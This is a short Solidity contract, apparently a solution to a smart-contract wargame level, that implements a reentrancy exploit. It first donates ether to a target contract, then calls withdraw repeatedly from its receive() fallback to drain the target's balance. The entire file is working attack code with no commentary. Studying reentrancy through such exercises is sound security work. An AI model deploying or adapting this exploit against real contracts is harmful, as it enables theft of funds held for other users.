// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IReentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentrancyAttack {
    IReentrance public target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    receive() external payable {
        target.withdraw(0.001 ether);
    }
}